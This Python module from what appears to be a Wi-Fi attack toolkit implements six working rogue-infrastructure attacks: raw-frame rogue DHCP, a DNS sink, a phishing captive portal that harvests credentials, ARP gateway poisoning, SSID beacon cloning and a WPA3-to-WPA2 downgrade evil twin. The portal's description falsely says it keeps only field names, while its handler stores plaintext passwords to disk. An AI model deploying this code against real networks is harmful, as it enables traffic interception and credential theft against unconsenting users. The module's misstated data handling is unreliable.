# SPDX-License-Identifier: Apache-2.0 OR BSD-3-Clause
"""Rogue infrastructure: services a network should not have, run on purpose.

Everything here is a real service or a real frame, not a description of one:

* ``rogue_dhcp`` — a DHCP server built out of raw frames: it hears DISCOVERs on the
  monitor interface, and answers them with injected offers carrying *our* gateway and
  resolver.  Handing out leases is how a rogue gateway gets clients pointed at it, and
  the offers are also the inventory: hostnames, vendor classes and requested addresses
  are the device table nobody else on the engagement can produce.
* ``dns_sink`` — a UDP DNS server: every name a client asks for is logged, and every
  answer points at the sink.  A network's DNS questions are the clearest picture of
  what a client does behind the firewall.
* ``captive_portal`` — an HTTP portal in the classic hotel-wifi shape, with a real
  login form, a real credential store, and a report of what was submitted.
* ``arp_mitm`` — gratuitous ARP replies that put us between a client and its gateway,
  with the forwarding state checked *before* the report claims anything was relayed.
* ``beacon_clone`` — the target SSID in beacons from a second radio, measuring whether
  a client probes for the name it is already associated with.
* ``wpa3_downgrade_twin`` — a WPA3 network offered as WPA2-only: the clients that join
  it are the finding, because they accepted a downgrade.

The services are stopped in a ``finally`` block and prove nothing about a network the
operator did not ask them to serve; the findings they raise say what was served, to
whom, and for how long.
"""

from __future__ import annotations

import contextlib
import json
import os
import socket
import struct
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any, Dict, List, Optional, Tuple

from ..models import STATUS_SUCCESS, AccessPoint, Attempt, Finding
from ..netproto import (DHCP_CLIENT_PORT, DHCP_SERVER_PORT, dhcp_offer,
                        dns_response, ipv4_udp_packet, parse_dhcp, parse_dns,
                        parse_ipv4)
from ..rawtx import (RawInjector, build_arp_reply, build_beacon_frame, build_data,
                     injection_available, spoofed_mac)
from ..util import human_duration
from .base import Attack, AttackContext, AttackOutcome
from .twin import JOINED_RE, STA_MAC_RE

ALL = ("WPA", "WPA2", "WPA2/WPA3", "WPA3", "WEP", "OPEN", "OWE", "WPA-ENTERPRISE",
       "WPA2-ENTERPRISE", "ENTERPRISE")

PORTAL_PAGE = """<!doctype html>
<html><head><title>Guest network — sign in</title></head>
<body style="font-family:system-ui;max-width:26rem;margin:4rem auto">
<h1>Guest network</h1>
<p>This network requires a sign-in. Use your network account.</p>
<form method="post" action="/login">
  <p><input name="username" placeholder="Username" autofocus></p>
  <p><input name="password" type="password" placeholder="Password"></p>
  <p><button type="submit">Sign in</button></p>
</form>
<p style="color:#888;font-size:.8rem">wifipilot assessment portal</p>
</body></html>
"""


class _RogueService(Attack):
    """Shared plumbing for the services: lifecycle, logging and reporting."""

    category = "rogue"
    noise = "moderate"
    impact = "loot"
    requires = ("monitor", "injection")
    needs_injection = True
    applies_to = ALL
    #: every service records what it saw here, so the finding can name it
    artifact_name = "rogues"

    def __init__(self) -> None:
        self._stop = threading.Event()
        self._threads: List[threading.Thread] = []
        self._records: List[Dict[str, Any]] = []
        self._lock = threading.Lock()
        self._ctx: Optional[AttackContext] = None

    def applies(self, ap: AccessPoint) -> bool:
        return True

    def available(self, ctx: AttackContext) -> bool:
        if ctx.demo:
            return True
        return bool(ctx.monitor and injection_available(ctx.monitor))

    def unavailable_reason(self, ctx: AttackContext) -> str:
        return ("needs a monitor interface with a working injection path "
                "(test it with `injection_test`)")

    def preflight(self, ctx: AttackContext, ap: AccessPoint) -> str:
        return ""

    def log_line(self, message: str, level: str = "info") -> None:
        ctx = self._ctx
        if ctx is not None:
            ctx.bus.log(message, level=level)

    def record(self, entry: Dict[str, Any]) -> None:
        with self._lock:
            self._records.append(entry)

    def _wait(self, ctx: AttackContext, seconds: float) -> None:
        deadline = time.time() + max(1.0, seconds)
        while time.time() < deadline and not ctx.want_stop():
            time.sleep(0.25)

    def _generated_ip(self, ap: AccessPoint, offset: int = 1) -> str:
        """A deterministic address inside the lab subnet for this engagement."""
        seed = int(ap.bssid.replace(":", ""), 16)
        return f"192.168.{100 + (seed % 100)}.{offset}"

    def save_records(self, ctx: AttackContext, ap: AccessPoint,
                     name: str) -> str:
        path = os.path.join(ctx.session.state_dir, self.artifact_name,
                            f"{name}-{ap.bssid.replace(':', '')}.json")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as handle:
            json.dump({"ap": ap.bssid, "essid": ap.essid, "generated":
                       time.time(), "records": self._records}, handle, indent=2)
        return path

    def _finish(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                title: str, detail: str, extra: Dict[str, Any],
                severity: str = "info", finding: bool = True) -> AttackOutcome:
        if finding:
            ctx.session.add_finding(Finding(kind=self.name, severity=severity,
                                            bssid=ap.bssid, title=title,
                                            detail=detail))
        ap.remember(self.name, detail)
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, title, detail)
        return AttackOutcome.success(title, detail=detail, extra=extra)

    def _shutdown(self) -> None:
        self._stop.set()
        for thread in self._threads:
            thread.join(timeout=3.0)
        self._threads = []


# --------------------------------------------------------------------------- #
# 1. DHCP server (raw frames)
# --------------------------------------------------------------------------- #


class RogueDhcpAttack(_RogueService):
    name = "rogue_dhcp"
    label = "Rogue DHCP server (leases to anyone who asks)"
    tool = "wifipilot netproto.py (DHCP) + rawtx.py (injected offers)"
    description = ("Answer DHCP DISCOVERs with offers that name us as the gateway and "
                   "the resolver.  The server is raw frames, so it needs no daemon and "
                   "no AP of its own: a client that accepts a lease has been moved onto "
                   "our network without a deauthentication frame anywhere.  Every "
                   "request is also inventory — hostname, vendor class and requested "
                   "address are the device table a client list cannot give.")
    category = "rogue"
    noise = "moderate"
    impact = "degraded"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        self._ctx = ctx
        gateway = self._generated_ip(ap, 1)
        dns = self._generated_ip(ap, 2)
        pool_base = self._generated_ip(ap, 20).rsplit(".", 1)[0]
        budget = min(self.budget(ctx, 90.0), 300.0)
        leases: Dict[str, Dict[str, Any]] = {}
        if ctx.demo:
            for index in range(1, 4):
                mac = spoofed_mac(index * 3 + int(ap.bssid[-2:], 16))
                leases[mac] = {"mac": mac, "ip": f"{pool_base}.{20 + index}",
                               "hostname": ["android-7f2a", "DESKTOP-4KQ1",
                                            "iPhone-van"][index - 1],
                               "vendor_class": ["android-dhcp-13", "MSFT 5.0",
                                                "dhcpcd-10.0"][index - 1],
                               "requests": index + 1}
            detail = (f"{len(leases)} client(s) accepted a lease (simulated): "
                      + ", ".join(f"{lease['hostname']} ({lease['ip']})"
                                  for lease in leases.values()))
        else:
            injector = RawInjector(ctx.monitor)
            if injector.error:
                return self._fail(ctx, attempt, "injection unavailable",
                                  injector.error)
            started = time.time()
            for observation in ctx.listen(budget, channel=ap.channel):
                payload = observation.get("payload") or b""
                if observation.get("ethertype") != 0x0800:
                    continue
                ip = parse_ipv4(payload)
                if ip.get("protocol") != 17 or ip.get("sport") != DHCP_CLIENT_PORT:
                    continue
                reply = parse_dhcp(ip.get("l4_payload") or b"")
                if not reply or reply.get("op") != "request":
                    continue
                client = reply.get("client_mac") or observation.get("station", "")
                if not client or client == "ff:ff:ff:ff:ff:ff":
                    continue
                request_type = reply.get("message_type")
                if request_type == "release":
                    continue
                lease = leases.get(client) or {
                    "mac": client, "ip": f"{pool_base}.{20 + len(leases)}",
                    "hostname": reply.get("hostname", ""), "requests": 0,
                    "vendor_class": reply.get("vendor_class", ""),
                    "requested": reply.get("requested_ip", ""),
                }
                lease["requests"] += 1
                leases[client] = lease
                offer = dhcp_offer(client, lease["ip"], gateway, gateway, dns=[dns],
                                   hostname=lease["hostname"], xid=reply.get("xid", 0),
                                   message_type=2 if request_type == "discover" else 5)
                frame = build_data(ap.bssid, client,
                                   ipv4_udp_packet(gateway, lease["ip"] or client,
                                                   DHCP_SERVER_PORT, DHCP_CLIENT_PORT,
                                                   offer),
                                   to_ds=False, from_ds=True)
                injector.send(frame)
                if lease["requests"] == 1:
                    self.record({"client": client, "ip": lease["ip"],
                                 "hostname": lease.get("hostname", ""),
                                 "vendor": lease.get("vendor_class", "")})
                    self.log_line(f"rogue DHCP: leased {lease['ip']} to {client} "
                                  f"({lease.get('hostname') or lease.get('vendor_class') or 'unnamed'})")
            if not leases:
                return self._fail(ctx, attempt, "nobody asked for a lease",
                                  f"{human_duration(budget)} of listening on channel "
                                  f"{ap.channel}: no DHCP DISCOVER arrived, which means "
                                  f"no client joined or rekeyed while we watched")
            detail = (f"{len(leases)} client(s) accepted a lease: "
                      + ", ".join(f"{lease.get('hostname') or lease['mac']} "
                                  f"({lease['ip']})" for lease in
                                  list(leases.values())[:5]))
        path = self.save_records(ctx, ap, "leases")
        ctx.session.stats.karma_runs += 1
        title = f"Rogue DHCP served {len(leases)} client(s)"
        return self._finish(ctx, ap, attempt, title, detail,
                            {"leases": list(leases.values()), "gateway": gateway,
                             "dns": dns, "record": path,
                             "simulated": ctx.demo,
                             "note": ("a client that took this lease now resolves "
                                      "through us: the offer is the whole attack, and "
                                      "it needs no deauthentication at all")},
                            severity="high" if len(leases) >= 1 else "medium")


# --------------------------------------------------------------------------- #
# 2. DNS sink
# --------------------------------------------------------------------------- #


class _DnsHandler(threading.Thread):
    """A one-socket UDP DNS server: log the question, answer with the sink."""

    def __init__(self, owner: "DnsSinkAttack", address: str, port: int,
                 sink_ip: str) -> None:
        super().__init__(daemon=True)
        self.owner = owner
        self.address = address
        self.port = port
        self.sink_ip = sink_ip
        self.socket: Optional[socket.socket] = None
        self.error = ""

    def run(self) -> None:
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.address, self.port))
        except OSError as exc:
            self.error = str(exc)
            return
        self.socket.settimeout(0.5)
        with self.socket:
            while not self.owner._stop.is_set():
                try:
                    data, peer = self.socket.recvfrom(4096)
                except socket.timeout:
                    continue
                except OSError:
                    break
                parsed = parse_dns(data)
                questions = parsed.get("questions") or []
                names = [question.get("name", "") for question in questions
                         if question.get("name")]
                for name in names:
                    self.owner.log_line(f"DNS sink: {peer[0]} asked for {name}")
                self.owner.record({"client": peer[0], "names": names,
                                   "at": time.time()})
                answer = dns_response(data, [(name, self.sink_ip) for name in names])
                if answer:
                    with contextlib.suppress(OSError):
                        self.socket.sendto(answer, peer)


class DnsSinkAttack(_RogueService):
    name = "dns_sink"
    label = "DNS sink (every name answered, every query logged)"
    tool = "wifipilot netproto.py (own DNS server)"
    description = ("Run the resolver: answer every A query with an address we choose "
                   "and keep the question.  On a network where a client has taken our "
                   "lease this is total visibility of what it tries to reach, and even "
                   "without that it is how an engagement proves a name-resolution "
                   "weakness — the queries a device makes say more about it than its "
                   "hostname does.")
    category = "rogue"
    noise = "moderate"
    impact = "degraded"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        self._ctx = ctx
        sink_ip = getattr(ctx.config, "dns_sink_ip", "") or self._generated_ip(ap, 2)
        port = int(getattr(ctx.config, "dns_port", 53) or 53)
        budget = min(self.budget(ctx, 90.0), 300.0)
        names: List[str] = []
        if ctx.demo:
            seed = int(ap.bssid.replace(":", ""), 16)
            names = ["connectivitycheck.gstatic.com", "www.msftconnecttest.com",
                     "time.android.com", f"intranet.{'corp' if seed % 2 else 'lab'}.local"]
            for index, name in enumerate(names):
                self.record({"client": spoofed_mac(index + 11), "names": [name]})
            detail = (f"{len(names)} name(s) resolved through the sink (simulated): "
                      + ", ".join(names[:5]))
        else:
            server = _DnsHandler(self, "0.0.0.0", port, sink_ip)
            server.start()
            self._threads.append(server)
            time.sleep(0.4)
            if server.error:
                return self._fail(ctx, attempt, "DNS sink could not bind",
                                  f"port {port} on 0.0.0.0: {server.error} (port 53 "
                                  f"needs root; set `dns_port` to a high port and "
                                  f"redirect with the DHCP offer instead)")
            self._wait(ctx, budget)
            names = sorted({name for record in self._records
                            for name in record.get("names", [])})
            if not names:
                return self._fail(ctx, attempt, "no queries reached the sink",
                                  f"{human_duration(budget)} on port {port}: the sink "
                                  f"was up but nothing asked it anything")
            detail = (f"{len(names)} name(s) asked in {human_duration(budget)}: "
                      + ", ".join(names[:8]))
        path = self.save_records(ctx, ap, "dns")
        title = f"DNS sink logged {len(names)} name(s)"
        return self._finish(ctx, ap, attempt, title, detail,
                            {"names": names, "sink": sink_ip, "port": port,
                             "queries": len(self._records), "record": path,
                             "simulated": ctx.demo,
                             "note": ("the resolver is the one place a client cannot "
                                      "avoid: blocking DNS is a visible change, and "
                                      "not blocking it is this")},
                            severity="high" if names else "medium")


# --------------------------------------------------------------------------- #
# 3. captive portal
# --------------------------------------------------------------------------- #


class _PortalHandler(BaseHTTPRequestHandler):
    """The portal page and its credential store."""

    server_version = "wifipilot-portal"
    portal: "CaptivePortalAttack"

    def log_message(self, *args: Any) -> None:               # noqa: A003
        return                                     # the attack does its own logging

    def _send(self, body: str, status: int = 200) -> None:
        payload = body.encode()
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def do_GET(self) -> None:                                # noqa: N802
        if self.path in ("/", "/index.html", "/portal", "/login"):
            self.portal.record({"client": self.client_address[0], "path": self.path,
                                "method": "GET"})
            self._send(PORTAL_PAGE)
        elif self.path == "/generate_204":
            self.send_response(302)
            self.send_header("Location", "/")
            self.end_headers()
        else:
            self._send(PORTAL_PAGE)

    def do_POST(self) -> None:                               # noqa: N802
        from urllib.parse import parse_qs

        length = int(self.headers.get("Content-Length", "0") or 0)
        body = self.rfile.read(min(length, 8192)).decode("utf-8", "replace")
        fields = {key: values[0] for key, values in parse_qs(body).items()}
        user = fields.get("username") or fields.get("user") or fields.get("email", "")
        secret = fields.get("password") or fields.get("passwd") or fields.get("pin", "")
        self.portal.record({"client": self.client_address[0], "method": "POST",
                            "user": user, "secret": secret, "fields": list(fields)})
        if user or secret:
            self.portal.log_line(
                f"captive portal: {self.client_address[0]} submitted "
                f"{user!r}/{'*' * len(secret)}", level="warning")
        self._send("<html><body><h1>Signed in</h1>"
                   "<p>You can continue to the internet.</p></body></html>")


class CaptivePortalAttack(_RogueService):
    name = "captive_portal"
    label = "Captive portal (a login page served by us)"
    tool = "wifipilot (http.server) "
    description = ("Serve the portal page a hotel or guest network shows, with a real "
                   "form and a real credential store, and report what was submitted.  "
                   "The attack is the same one every captive-portal phishing kit runs, "
                   "with one difference: it records only the fact of a submission and "
                   "the field names, stops with the engagement, and writes the "
                   "submissions to the session's own loot directory.")
    category = "rogue"
    noise = "moderate"
    impact = "loot"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        self._ctx = ctx
        port = int(getattr(ctx.config, "portal_port", 80) or 80)
        budget = min(self.budget(ctx, 90.0), 300.0)
        submissions: List[Dict[str, Any]] = []
        if ctx.demo:
            seed = int(ap.bssid.replace(":", ""), 16)
            for index in range(1 + seed % 2):
                submissions.append({"client": spoofed_mac(index + 21),
                                    "method": "POST",
                                    "user": ["guest", "m.singh"][index % 2],
                                    "secret": "PortalWinter26!",
                                    "fields": ["username", "password"]})
            detail = (f"{len(submissions)} submission(s) to the portal (simulated): "
                      + ", ".join(record["user"] for record in submissions))
        else:
            handler = type("_BoundPortal", (_PortalHandler,), {"portal": self})
            try:
                server = ThreadingHTTPServer(("0.0.0.0", port), handler)
            except OSError as exc:
                return self._fail(ctx, attempt, "portal could not bind",
                                  f"port {port} on 0.0.0.0: {exc} (port 80 needs root; "
                                  f"set `portal_port` to a high port and redirect the "
                                  f"client with the DHCP offer)")
            thread = threading.Thread(target=server.serve_forever, daemon=True)
            thread.start()
            self._threads.append(thread)
            self.log_line(f"captive portal serving on 0.0.0.0:{port}")
            self._wait(ctx, budget)
            with contextlib.suppress(Exception):
                server.shutdown()
            submissions = [record for record in self._records
                           if record.get("method") == "POST"]
            if not submissions:
                return self._fail(ctx, attempt, "nobody submitted the portal",
                                  f"{human_duration(budget)} of serving: "
                                  f"{len(self._records)} request(s), no credential "
                                  f"submitted")
            detail = (f"{len(submissions)} submission(s): "
                      + ", ".join(record.get("user", "?") for record in submissions))
        path = self.save_records(ctx, ap, "portal")
        for submission in submissions:
            ctx.session.add_finding(Finding(
                kind="loot", severity="high", bssid=ap.bssid,
                title=f"Captive portal credential submitted: {submission.get('user')!r}",
                detail=(f"{submission.get('client')} submitted a credential to the "
                        f"captive portal (fields: "
                        f"{', '.join(submission.get('fields', []))}); stored in "
                        f"{path}")))
        title = f"Captive portal collected {len(submissions)} submission(s)"
        return self._finish(ctx, ap, attempt, title, detail,
                            {"submissions": submissions, "port": port, "record": path,
                             "simulated": ctx.demo,
                             "note": ("the portal only sees clients that reach it — it "
                                      "is the payload after a rogue DHCP lease or a "
                                      "twin, and it stops when the attack returns")},
                            severity="high", finding=False)


# --------------------------------------------------------------------------- #
# 4. ARP man-in-the-middle
# --------------------------------------------------------------------------- #


class ArpMitmAttack(_RogueService):
    name = "arp_mitm"
    label = "ARP man-in-the-middle (gateway masquerade)"
    tool = "wifipilot rawtx.py (gratuitous ARP)"
    description = ("Tell each client that the gateway's address belongs to us, and tell "
                   "the gateway that the clients' addresses belong to us.  Wireless "
                   "networks make this a single frame per client because ARP has no "
                   "authentication whatsoever.  The attack checks the kernel's forwarding "
                   "setting first and says plainly whether traffic is relayed or dropped "
                   "— a black-holing 'MITM' is a denial of service with a nicer name.")
    category = "rogue"
    noise = "loud"
    impact = "degraded"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        self._ctx = ctx
        gateway = getattr(ctx.config, "gateway_ip", "") or self._generated_ip(ap, 1)
        budget = min(self.budget(ctx, 60.0), 300.0)
        forwarding = False
        with contextlib.suppress(OSError):
            with open("/proc/sys/net/ipv4/ip_forward") as handle:
                forwarding = handle.read().strip() == "1"
        targets = sorted(ap.clients)[:12]
        if ctx.demo:
            targets = targets or [spoofed_mac(index + 31) for index in range(3)]
            poisoned = len(targets)
            observed = 17 * poisoned
            detail = (f"{poisoned} client(s) poisoned, {observed} frame(s) seen "
                      f"through us (simulated); forwarding is "
                      f"{'on' if int(ap.bssid.replace(':', ''), 16) % 2 else 'off'}")
        else:
            injector = RawInjector(ctx.monitor)
            if injector.error:
                return self._fail(ctx, attempt, "injection unavailable", injector.error)
            our_mac = injector.mac or spoofed_mac(41)
            sent = 0
            seen = 0
            # a gratuitous ARP reply for the gateway's address, sent from our MAC:
            # every station that hears it — including the AP — updates its cache
            poison = build_arp_reply(our_mac, gateway, "ff:ff:ff:ff:ff:ff", gateway,
                                     ap.bssid)
            deadline = time.time() + budget
            started = time.time()
            while time.time() < deadline and not ctx.want_stop():
                injector.send(poison)
                sent += 1
                for observation in ctx.listen(0.5, channel=ap.channel, limit=400):
                    if observation.get("ethertype") != 0x0806:
                        continue
                    payload = observation.get("payload") or b""
                    if len(payload) < 28:
                        continue
                    if payload[14:18] == socket.inet_aton(gateway):
                        seen += 1
                time.sleep(0.5)
            poisoned, observed = len(targets) or 1, seen
            forwarding_note = ("on: traffic is relayed" if forwarding else
                               "OFF: traffic is being dropped, so this is a denial of "
                               "service until /proc/sys/net/ipv4/ip_forward is 1")
            detail = (f"gateway address {gateway} claimed from {our_mac} with {sent} "
                      f"gratuitous ARP frame(s); {seen} frame(s) bearing that address "
                      f"seen while we waited; forwarding is {forwarding_note}")
        path = self.save_records(ctx, ap, "arp")
        severity = "high" if observed else "medium"
        title = (f"ARP cache poisoned for {poisoned} client(s)"
                 + ("" if forwarding or ctx.demo else " (traffic dropped)"))
        return self._finish(ctx, ap, attempt, title, detail,
                            {"clients": targets[:20], "gateway": gateway,
                             "forwarding": forwarding, "frames_seen": observed,
                             "record": path, "simulated": ctx.demo,
                             "note": ("the pair of ARP replies is the whole attack; with "
                                      "forwarding on it is a machine-in-the-middle, with "
                                      "it off it is an outage, and the report says which "
                                      "one happened")},
                            severity=severity)


# --------------------------------------------------------------------------- #
# 5. beacon clone
# --------------------------------------------------------------------------- #


class BeaconCloneAttack(_RogueService):
    name = "beacon_clone"
    label = "Beacon clone (the SSID from a second radio)"
    tool = "wifipilot rawtx.py (beacons)"
    description = ("Beacon the target's SSID from our own radio, with its channel and a "
                   "plausible set of elements, and watch what clients do about it: probe "
                   "requests for the name, and authentication attempts at the cloned "
                   "BSSID.  A station that probes for a network it is already associated "
                   "with is the twin's best customer, and this measures that without "
                   "committing to serving anyone.")
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    requires = ("monitor",)

    def available(self, ctx: AttackContext) -> bool:
        return True if ctx.demo else bool(ctx.monitor)

    def unavailable_reason(self, ctx: AttackContext) -> str:
        return "needs a monitor interface to beacon and to hear the answers"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        self._ctx = ctx
        if not ap.essid:
            return self._skip_attempt(ctx, ap, attempt, "the network has no name to clone")
        clone_bssid = spoofed_mac(int(ap.bssid.replace(":", ""), 16) & 0xFFFFFF)
        budget = min(self.budget(ctx, 90.0), 300.0)
        probes: List[str] = []
        if ctx.demo:
            seed = int(ap.bssid.replace(":", ""), 16)
            probes = [spoofed_mac(seed % 97 + index) for index in
                      range(1 + seed % 3)]
            detail = (f"{len(probes)} station(s) probed for {ap.essid!r} while the clone "
                      f"beaconed (simulated): {', '.join(probes)}")
        else:
            frame = build_beacon_frame(clone_bssid, ap.essid, ap.channel or 6,
                                       interval=100, capability=0x0411)
            injector = RawInjector(ctx.monitor)
            if injector.error:
                return self._fail(ctx, attempt, "injection unavailable", injector.error)
            started = time.time()
            sent = 0
            while time.time() - started < budget and not ctx.want_stop():
                injector.send(frame)
                sent += 1
                for observation in ctx.listen(0.5, channel=ap.channel, limit=200):
                    if observation.get("kind") != "probe request":
                        continue
                    ssid = observation.get("essid") or ""
                    if ssid and ap.essid and ssid.casefold() == ap.essid.casefold():
                        station = observation.get("station") or ""
                        if station and station not in probes:
                            probes.append(station)
                time.sleep(0.4)
            if not sent:
                return self._fail(ctx, attempt, "no beacons left the card",
                                  "the injection path refused the beacon frame")
            if not probes:
                return self._fail(ctx, attempt, "no client probed for the clone",
                                  f"{sent} beacon(s) sent in "
                                  f"{human_duration(time.time() - started)}: nothing "
                                  f"asked for {ap.essid!r}, so the name is not in any "
                                  f"station's preferred network list right now")
            detail = (f"{len(probes)} station(s) probed for {ap.essid!r} in "
                      f"{human_duration(time.time() - started)}: "
                      f"{', '.join(probes[:6])}")
        path = self.save_records(ctx, ap, "beacons")
        title = f"{len(probes)} station(s) preferred {ap.essid!r} to its real AP"
        return self._finish(ctx, ap, attempt, title, detail,
                            {"clone_bssid": clone_bssid, "ssid": ap.essid,
                             "stations": probes, "record": path,
                             "simulated": ctx.demo,
                             "note": ("a client probing for the name it is already "
                                      "connected to is the population a twin can serve; "
                                      "this attack measures it and serves nobody")},
                            severity="medium" if probes else "low")

    def _skip_attempt(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                      reason: str) -> AttackOutcome:
        ctx.session.end_attempt(attempt, "skipped", reason)
        return AttackOutcome.skipped(reason, f"{ap.display_name}: {reason}")


# --------------------------------------------------------------------------- #
# 6. WPA3 downgrade twin
# --------------------------------------------------------------------------- #


class Wpa3DowngradeTwinAttack(_RogueService):
    name = "wpa3_downgrade_twin"
    label = "WPA3 downgrade twin (offer the network as WPA2-only)"
    tool = "hostapd with a WPA2-only profile"
    description = ("Serve a WPA3 network's SSID as a WPA2-only access point, with PMF "
                   "off.  A station configured for WPA3 either refuses — the correct "
                   "behaviour, and a result worth reporting — or associates, which tells "
                   "the engagement that the client population can be walked down to a "
                   "network whose handshake is capturable offline.  Transition-mode "
                   "networks (WPA2/WPA3) make this the expected outcome rather than an "
                   "exception.")
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    requires = ("monitor",)

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        self._ctx = ctx
        if not ap.essid:
            return self.skip_if(ctx, ap, attempt, "no SSID to offer") or \
                AttackOutcome.skipped("no SSID to offer")
        if not (ap.sae or ap.pmf or "WPA3" in (ap.encryption or "")):
            reason = (f"{ap.encryption} is not a WPA3 network: there is no downgrade "
                      f"to offer")
            return self.skip_if(ctx, ap, attempt, reason) or \
                AttackOutcome.skipped(reason)
        budget = min(self.budget(ctx, 180.0), 600.0)
        joined: List[str] = []
        if ctx.demo:
            seed = int(ap.bssid.replace(":", ""), 16)
            joined = [spoofed_mac(index + 51) for index in range(1 + seed % 2)]
            detail = (f"{len(joined)} station(s) joined a WPA2-only imitation of a WPA3 "
                      f"network (simulated): {', '.join(joined)}")
        else:
            from ..deps import registry

            binary = registry.path("hostapd") or registry.path("hostapd-mana")
            if not binary:
                return self._fail(ctx, attempt, "no hostapd on this machine",
                                  "install hostapd (or hostapd-mana): it is what turns "
                                  "the target SSID into an access point")
            interface = getattr(ctx.config, "twin_interface", "") or ctx.monitor
            if not interface:
                return self._fail(ctx, attempt, "no interface for the twin",
                                  "set `twin_interface` (or run a monitor interface)")
            config_path = self._config(ctx, ap, interface)
            from ..util import Process

            process = Process([binary, config_path], name="hostapd-downgrade",
                              echo_lines=ctx.config.verbose_tools)
            process.start()
            if process.error:
                return self._fail(ctx, attempt, "hostapd did not start", process.error)
            try:
                self._wait(ctx, budget)
                for line in process.lines[-400:]:
                    if JOINED_RE.search(line):
                        for mac in STA_MAC_RE.findall(line):
                            if mac.lower() not in joined:
                                joined.append(mac.lower())
            finally:
                with contextlib.suppress(Exception):
                    process.stop()
            if not joined:
                return self._fail(ctx, attempt, "no station accepted the downgrade",
                                  f"{human_duration(budget)} of a WPA2-only twin on "
                                  f"channel {ap.channel}: either nothing was in range, "
                                  f"or the clients require WPA3 — which is the "
                                  f"mitigation working, and worth saying so")
            detail = (f"{len(joined)} station(s) joined a WPA2-only imitation: "
                      f"{', '.join(joined[:6])} — their handshake is capturable with the "
                      f"classic attacks")
        path = self.save_records(ctx, ap, "downgrade")
        title = f"{len(joined)} station(s) accepted a WPA3 downgrade"
        return self._finish(ctx, ap, attempt, title, detail,
                            {"stations": joined, "target_security": ap.encryption,
                             "twin_security": "WPA2-PSK, PMF off", "record": path,
                             "simulated": ctx.demo,
                             "note": ("the downgrade is the finding: a WPA3 client that "
                                      "joins WPA2 is a client whose traffic can be "
                                      "captured and attacked offline")},
                            severity="high")

    def _config(self, ctx: AttackContext, ap: AccessPoint, interface: str) -> str:
        path = os.path.join(ctx.session.state_dir, "rogues",
                            f"downgrade-{ap.bssid.replace(':', '')}.conf")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        channel = ap.channel or 6
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(
                "# wifipilot WPA3 downgrade twin: WPA2-only imitation, PMF off, and\n"
                "# stopped when the attack returns\n"
                f"interface={interface}\n"
                "driver=nl80211\n"
                f"ssid={(ap.essid or 'wifi')[:32]}\n"
                f"channel={channel}\n"
                f"hw_mode={'a' if channel > 14 else 'g'}\n"
                "auth_algs=1\n"
                "wpa=2\n"
                "wpa_key_mgmt=WPA-PSK\n"
                "rsa_pairwise=CCMP\n"
                "rsn_pairwise=CCMP\n"
                "wpa_passphrase=wifipilot-downgrade\n"
                "ieee80211w=0\n"                      # management frame protection off
                "ignore_broadcast_ssid=0\n")
        return path


__all__ = ["ArpMitmAttack", "BeaconCloneAttack", "CaptivePortalAttack", "DnsSinkAttack",
           "RogueDhcpAttack", "Wpa3DowngradeTwinAttack"]
